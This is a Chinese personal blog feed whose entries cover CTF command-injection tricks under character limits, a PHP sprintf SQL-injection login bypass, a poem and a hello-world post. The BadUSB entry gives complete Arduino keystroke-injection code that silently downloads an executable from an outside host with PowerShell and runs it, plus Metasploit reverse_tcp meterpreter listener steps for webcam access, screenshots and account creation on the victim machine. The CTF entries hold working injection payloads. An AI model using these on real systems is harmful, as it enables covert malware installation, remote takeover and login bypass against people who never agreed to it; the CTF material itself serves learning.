    <content type="html"><![CDATA[<p>今天刷到了对字节长度限制的命令执行题目，通过看一些视频和博客学习到一些小技巧，在这里总结一下：<br>这类题目会对命令执行的点进行字符数目限制，导致大多常见的命令都被过滤，这就需要深入了解一些linux的命令进行拼接，缩短字符的同时达到同样的效果</p><h1 id="字符长度限制命令注入的技巧"><a href="#字符长度限制命令注入的技巧" class="headerlink" title="字符长度限制命令注入的技巧"></a>字符长度限制命令注入的技巧</h1><h2 id="trick1"><a href="#trick1" class="headerlink" title="trick1"></a>trick1</h2><p>先来了解一个命令</p><p><code>&gt;xx 创建xx xx为执行命令，但是xx是一个能显示代码的命令，之后通过执行 </code></p><p><code>*&gt;x  将xx执行写到x文件。</code></p><p>举一个利用的例子:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"> &gt;<span class="hljs-built_in">ls</span><br><br>*&gt;a<br></code></pre></td></tr></table></figure><p>这样访问a文件就能看到全部ls所得到的内容</p><p>或者：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">&gt;<span class="hljs-built_in">cat</span><br><br>&gt;flag<br><br>*<br></code></pre></td></tr></table></figure><p>这种形式会直接得到cat flag的结果，如果在&gt;cat和&gt;flag之后再linux的命令行里输入echo *就会输出cat flag的字符，所以这里的 *  等于cat flag</p><p>利用这种拼接的方法可以把长命令分割达到缩短字符的作用</p><h2 id="trick2"><a href="#trick2" class="headerlink" title="trick2"></a>trick2</h2><p>在上面命令组装的时候还有一个问题，就是 * 会按字母顺序来输出字符，这就导致一些命令执行顺序被打乱</p><p>比如:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">&gt;<span class="hljs-built_in">ls</span><br>&gt;<span class="hljs-literal">-l</span><br><span class="hljs-built_in">echo</span> *<br></code></pre></td></tr></table></figure><p>这里的回显是 -t ls，那这里就有了反序的需求</p><h3 id="反序命令"><a href="#反序命令" class="headerlink" title="反序命令"></a>反序命令</h3><p>首先还是用&gt;创建两个文件l-和sl，这样顺序恰好满足需求，现在就考虑如何恢复正常的顺序来执行</p><p><img src="/test3img/1.jpg"></p><p>把l -sl组合放入一个v文件，最后用一个命令将其反转即可</p><p>但是当前目录是存在三个文件的：</p><p>l ,-sl,v</p><p>因为存在v如果直接使用*&gt;v存入的命令就会使l -sl v，干扰了命令执行</p><p>这里的解决办法是使用dir命令</p><p>在创建完l- sl后执行&gt;dir命令，此时文件夹下应该存在这三个文件：</p><p>dir  l-  sl</p><p>但是dir渝澳dir a b&gt;c只会将a b写到c中，所以此时再执行*&gt;v,那么v文件里就只剩l- sl了，接下来只要将他反序就行了</p><p>反序用到的命令是rev，先&gt;rev创建一个名为rev的文件，此时目录内的文件结构是:</p><p>dir   l-   rev   sl   v</p><p>这5个文件，在&gt;rev后执行*v就能将v里面的内容反序成 ls -l了</p><h2 id="三位数限制"><a href="#三位数限制" class="headerlink" title="三位数限制"></a>三位数限制</h2><p>在比较极端的限制3位的命令执行时，可以使用nl命令</p><p>nl: 命令读取 File 参数（缺省情况下标准输入），计算输入中的行号，将计算过的行号写入标准输出。 在输出中，nl 命令根据您在命令行中指定的标志来计算左边的行。</p><p>payload:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">&gt;nl<br>*&gt;a<br></code></pre></td></tr></table></figure><p>之后再访问a也能得到目录下的文件</p><p>原理:</p><p>创建nl文件后，目录结构大致是这样:</p><p>nl   flag.txt   robot.txt</p><p>*&gt;a就把nl   flag.txt   robot.txt的执行结果保存到a中</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>从大佬的博客中还学到一种删除的思路</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">&gt;<span class="hljs-built_in">rm</span><br>*&gt;a<br></code></pre></td></tr></table></figure><p>这个操作可以删除rm文件后面的文件，在一些特殊情况下可以使用</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>利用rubber ducker实现msf攻击</title>
    <link href="/2021/09/03/text1/"/>
    <url>/2021/09/03/text1/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本来打算使用u盘做一个简单系统的启动盘，查了好久也没有找到可以插入u盘就自动运行exe格式文件的方法，至于提到的autorun配置文件的方法已经过时没法用了。但是偶然间了解到了badusb，看了一下比较感兴趣就买了一个玩玩，顺便也简单学习下msf<img src="/textimg/text1/1.jpg"></p><p><img src="/textimg/text1/2.jpg"></p><p>这种东西插入电脑无需独立安装驱动，直接模拟键鼠进行输入，由于是开发板，可以使用arduino进行烧录，写入一些有害的执行脚本，打出无视杀软下载木马的骚操作</p><p>目前这个漏洞并没有什么太好的解决办法，一般的用户电脑插入之后不会有任何警告，了解了一下目前只有360的变形虫防护可以实现拦截。自己动手实现一下攻击过程还是挺有意思的，在这里记录一下</p><h1 id="制作过程"><a href="#制作过程" class="headerlink" title="制作过程"></a>制作过程</h1><p>先下载一个<a href="https://link.jianshu.com/?t=http://downloads.arduino.cc/arduino-1.6.4-windows.zip">Arduino</a>，<br>界面如下：</p><p><img src="/textimg/text1/3.jpg"></p><p>我买的是比较便宜的rubber ducker，具体软件的配置过程就不赘述了，下载安装好对应版本的开发板管理就可以进行编写了。之里面写的执行脚本是键鼠指令，有点类似于misc键鼠抓包分析时得到的东西。不过相对来说也比较简单，因为指令比较单一，简单学习一下就能理解自己写了，大概就分为延时指令，文字输入指令，和特殊按键输入指令三个部分代码都是固定的</p><h2 id="脚本编写思路"><a href="#脚本编写思路" class="headerlink" title="脚本编写思路"></a>脚本编写思路</h2><p>由于我自己还不会写木马程序，所以我想实现的是通过kali的msf模块生成木马，并上传到我的github项目上，然后在rubber ducky上编写从github上下载并运行木马的脚本即可</p><p>一开始我写的脚本是这样：</p><p>#include “DigiKeyboard.h”</p><p>void setup() {<br>DigiKeyboard.sendKeyStroke(0);<br>DigiKeyboard.delay(1000);<br>DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);<br>DigiKeyboard.delay(500);<br>DigiKeyboard.println(“cmd”);<br>DigiKeyboard.delay(200);<br>DigiKeyboard.println(“powershell”);<br>DigiKeyboard.delay(200);<br>DigiKeyboard.println(“$clnt = new-object System.Net.WebClient; “);<br>DigiKeyboard.delay(200);<br>DigiKeyboard.println(“$url=’<a href="https://lyyyds.xyz/flash.exe&#39;;&quot;">https://lyyyds.xyz/flash.exe&#39;;&quot;</a>);<br>DigiKeyboard.delay(200);<br>DigiKeyboard.println(“$file = ‘D:\flash.exe’;”);<br>DigiKeyboard.delay(200);<br>DigiKeyboard.println(“$clnt.DownloadFile($url,$file); “);<br>DigiKeyboard.delay(1000);<br>DigiKeyboard.println(“START D:\flash.exe “);<br>DigiKeyboard.delay(500);<br>DigiKeyboard.println(“exit”);</p><p>}</p><p>void loop() {<br>}</p><p>但是这样有个缺点就是在下载和运行之间有个1秒的延时，msf生成的木马并没有免杀，这一秒就会被杀毒软件清理掉导致木马运行失败，后来想到运行界面是可以执行多条指令，只要长度合适即可，所以又修改成了这种：</p><p>#include “DigiKeyboard.h”</p><p>void setup() {<br>DigiKeyboard.sendKeyStroke(0);<br>DigiKeyboard.delay(500);<br>DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);<br>DigiKeyboard.delay(500);<br>DigiKeyboard.println(“powershell -Command $clnt = new-object System.Net.WebClient;$url= ‘<a href="https://lyyyds.xyz/flash.exe&#39;;$file">https://lyyyds.xyz/flash.exe&#39;;$file</a> = ‘ %HOMEPATH%\flash.exe ‘;$clnt.DownloadFile($url,$file);%HOMEPATH%\flash.exe;”);<br>}<br>void loop() {<br>}</p><p>这样写的好处就是下载命令和运行命令依次执行，可以在木马被杀掉之前运行程序，同时也缩短了脚本运行时间，下面的脚本运行一套大约2-3秒的时间就能在宿主机上下载并运行木马。</p><h2 id="arduino烧录"><a href="#arduino烧录" class="headerlink" title="arduino烧录"></a>arduino烧录</h2><p>将写好的代码放入arduino中，点击这里的编译，等待出现60内插入的提示插入开发板即可：</p><p>等这里的提示出现thinks就说明烧录成功了<img src="/textimg/text1/4.jpg"></p><h2 id="msf木马的配置"><a href="#msf木马的配置" class="headerlink" title="msf木马的配置"></a>msf木马的配置</h2><p>首先打开kali虚拟机</p><p>使用命令生成一个名为flash.exe的木马病毒</p><p><img src="/textimg/text1/5.jpg"></p><p>打开msfconsole开始监听</p><p>打开终端输入msfconsole<br>使用监听模块：use exploit/multi/handler<br>设置payload:set payload windows/meterpreter/reverse_tcp<br>设置攻击机kali linux的地址：set lhost 192.168.45.136 （ip要与生成木马时的ip一致）<br>设置监听端口:set lport 4444 (端口要与生成木马时的端口一致）</p><p><img src="/textimg/text1/6.jpg"></p><p>运行 exploit</p><p><img src="/textimg/text1/7.jpg"></p><p>这样就开启了监听模式，然后把root文件夹下的flash.exe上传到github项目上</p><p><img src="/textimg/text1/8.jpg"></p><h1 id="对靶机的控制"><a href="#对靶机的控制" class="headerlink" title="对靶机的控制"></a>对靶机的控制</h1><p>插入设备之后，脚本就控制powershell自动下载木马，可以看到虽然火绒报毒杀掉了木马程序，可木马还是被执行了</p><p><img src="/textimg/text1/9.jpg"></p><p><img src="/textimg/text1/10.jpg"></p><p>尝试一下基本指令</p><p><img src="/textimg/text1/11.jpg"></p><p>截图命令成功，打开摄像头成功，图像这里就不展示了</p><p><img src="/textimg/text1/12.jpg"> </p><p>使用execute命令打开一下靶机的计算机程序，也是正常打开了</p><p><img src="/textimg/text1/13.jpg"></p><p>甚至可以使用shell操作命令提示符，新建一个账户用来自己登陆，而这些所有的操作在靶机上是没有任何提示警告的</p><h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1><p>感觉msf的模块还是满强大的，还有很多其他功能后续要学习下，另外我没有做内网穿透，所以攻击过程只针对局域网，至于这个板子用起来感觉还不错，第一次比较正规的写自己的博客，有很多不足，以后慢慢改进！</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sprintf注入</title>
    <link href="/2021/08/23/sprintf%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/08/23/sprintf%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>今天刷到了ctfshow萌新赛的一个题，学到了一个新知识点，在这里整理学习下关于sprintf函数的注入</p><h1 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h1><p><img src="/sprintf%E6%B3%A8%E5%85%A5img/1.jpg" alt="1"></p><p><img src="/sprintf%E6%B3%A8%E5%85%A5img/2.png" alt="2"></p><h1 id="sprintf-函数"><a href="#sprintf-函数" class="headerlink" title="sprintf()函数"></a>sprintf()函数</h1><h2 id="定义和语法"><a href="#定义和语法" class="headerlink" title="定义和语法"></a>定义和语法</h2><p>sprintf()函数是将格式化的字符串写入到变量中</p><p>语法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">sprintf(format,arg1,arg2,arg++)<br></code></pre></td></tr></table></figure><p><em>arg1*、</em>arg2*、*++* 参数将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 <em>arg1</em>，在第二个 % 符号处，插入 <em>arg2</em>，依此类推。</p><p><strong>注释：</strong>如果 % 符号多于 <em>arg</em> 参数，则您必须使用占位符。占位符位于 % 符号之后，由数字和 “$“ 组成</p><p>从官网找到了一些函数的详细用法</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>format</td><td>必需。规定字符串以及如何格式化其中的变量。</td></tr><tr><td></td><td>可能的格式值：</td></tr><tr><td></td><td>%% - 返回一个百分号 %</td></tr><tr><td></td><td>%b - 二进制数</td></tr><tr><td></td><td>%c - ASCII 值对应的字符</td></tr><tr><td></td><td>%d - 包含正负号的十进制数（负数、0、正数</td></tr><tr><td></td><td>%e - 使用小写的科学计数法（例如 1.2e+2）</td></tr><tr><td></td><td>%E - 使用大写的科学计数法（例如 1.2E+2）</td></tr><tr><td></td><td>%u - 不包含正负号的十进制数（大于等于 0）</td></tr><tr><td></td><td>%f - 浮点数（本地设置）</td></tr><tr><td></td><td>%F - 浮点数（非本地设置）</td></tr><tr><td></td><td>%g - 较短的 %e 和 %f</td></tr><tr><td></td><td>%G - 较短的 %E 和 %f</td></tr><tr><td></td><td>%o - 八进制数</td></tr><tr><td></td><td>%s - 字符串</td></tr><tr><td></td><td>%x - 十六进制数（小写字母</td></tr><tr><td></td><td>%X - 十六进制数（大写字母）</td></tr><tr><td></td><td>附加的格式值。必需放置在 % 和字母之间（例如 %.2f）：</td></tr><tr><td></td><td>+ （在数字前面加上 + 或 - 来定义数字的正负性。默认情况下，只有负数才做标记，正数不做标记）</td></tr><tr><td></td><td>‘ （规定使用什么作为填充，默认是空格。它必须与宽度指定器一起使用。例如：%’x20s（使用 “x” 作为填充））</td></tr><tr><td></td><td>- （左调整变量值）</td></tr><tr><td></td><td>[0-9] （规定变量值的最小宽度）</td></tr><tr><td></td><td>.[0-9] （规定小数位数或最大字符串长度）</td></tr><tr><td></td><td><strong>注释：</strong>如果使用多个上述的格式值，它们必须按照以上顺序使用。</td></tr><tr><td>arg1</td><td>必填。规定插到 <em>format</em> 字符串中第一个 % 符号处的参数。</td></tr><tr><td>arg2</td><td>可选。规定插到 <em>format</em> 字符串中第二个 % 符号处的参数。</td></tr><tr><td><em>arg++</em></td><td>可选。规定插到 <em>format</em> 字符串中第三、四等 % 符号处的参数。</td></tr><tr><td><strong>返回值</strong></td><td>已格式化的字符串。</td></tr></tbody></table><h1 id="占位符"><a href="#占位符" class="headerlink" title="占位符"></a>占位符</h1><p>  %1$s表示替换的为String类型</p><p>  %1$d表示替换的为int类型</p><p>  数字表示替换字符串中要替换的位置，若一个字符串要替换两个int类型，在替换位置分别写%1$d和%2$d.</p><p>  %s 、%d为缩写方式，只替换一个位置，可以这么写</p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>当我们在sprintf的format参数里输入%的时候，他的后面如果加了一个\转义符，那%\就会被认为是和%c,%b之类的一种类型，他会把%\当作一种类型去匹配后面arg传来的参数，但是这个类型没有定义，所以规定匹配空，这就可能导致\被吃掉</p><p>在本题中：</p><h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><p> 传入?name=admin&amp;pass=%1$’ or 1=1–+</p><p>这里的%1$’会首先被addslashes在’前加上转义号\来转义掉’，就会出现%1$\’，这样这里的%1$\就会被当作一种不存在的类型被匹配为空，最后得到：</p><p>?name=admin&amp;pass=’ or 1=1–+</p><p>形成万能密码绕过登录</p><h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><p>或者匹配使用%c匹配相应的ascii字符，例如：</p><p>如果format中的格式化符为%1$c，则表示第一个参数位置的类型为%c，再来看一下上面的代码，如果我们输入的name为39并且是以%c的形式，那就是相当于是单引号，我这里构造payload: name=39&amp;pass=1%1$c||1=1%23 还原一下就相当于输入name=39&amp;pass=1’ || 1=1%23</p><p>还是能达到万能密码的效果</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>这道题一开始我的想法是利用宽字节注入</p><p>传入传入%df’，可以看到存在宽字节注入成功的回显，从回显的逻辑上来看万能密码注入是成功的，但是并没有显示成功的页面，后来询问了大佬才明白，这道题设置了数据库gbk编码，虽然在前端显示了，但是注入不进数据库，所以这道题的宽字节注入思路行不通</p><p><img src="/sprintf%E6%B3%A8%E5%85%A5img/3.png" alt="3"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>《这样就很好》</title>
    <link href="/2021/08/03/test/"/>
    <url>/2021/08/03/test/</url>
    
    <content type="html"><![CDATA[<p>春天消逝了</p><p>树枝上还有浓稠的鸟鸣</p><p>这样就很好</p><p>听不见鸟鸣</p><p>却有一个露水丰盈的早晨</p><p>这样就不坏</p><p>这个早晨不是故乡的</p><p>是在路上</p><p>我不知道你在哪里</p><p>但知道你在世上</p><p>我就很安心</p><p>我不知道你在和谁说话</p><p>但是知道你用的口音</p><p>仿佛我听见</p><p>人间有许多悲伤</p><p>我承担的不是全部</p><p>这样就很好</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2021/08/02/hello-world/"/>
    <url>/2021/08/02/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Hello ，I’m liuyang ,this is my new blog!<br>                      welcome</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
